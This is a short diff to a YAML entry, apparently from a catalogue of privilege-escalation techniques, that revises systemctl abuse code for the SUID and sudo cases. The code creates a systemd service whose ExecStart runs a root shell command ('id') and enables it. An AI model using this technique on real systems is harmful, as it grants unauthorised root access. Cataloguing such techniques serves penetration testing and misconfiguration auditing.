@@ -2,20 +2,20 @@
 functions:
   suid:
     - code: |
-        TF=/tmp/test.service
+        TF=$(mktemp).service
         echo '[Service]
           Type=oneshot
-          ExecStart=/bin/sh -c "id >> /tmp/output"
+          ExecStart=/bin/sh -c "id > /tmp/output"
           [Install]
           WantedBy=multi-user.target' > $TF
-        systemctl link $TF
-        systemctl enable --now $TF
+        ./systemctl link $TF
+        ./systemctl enable --now $TF
   sudo:
     - code: |
-        TF=/tmp/test.service
+        TF=$(mktemp).service
         echo '[Service]
           Type=oneshot
-          ExecStart=/bin/sh -c "id >> /tmp/output"
+          ExecStart=/bin/sh -c "id > /tmp/output"
           [Install]
           WantedBy=multi-user.target' > $TF
         sudo systemctl link $TF
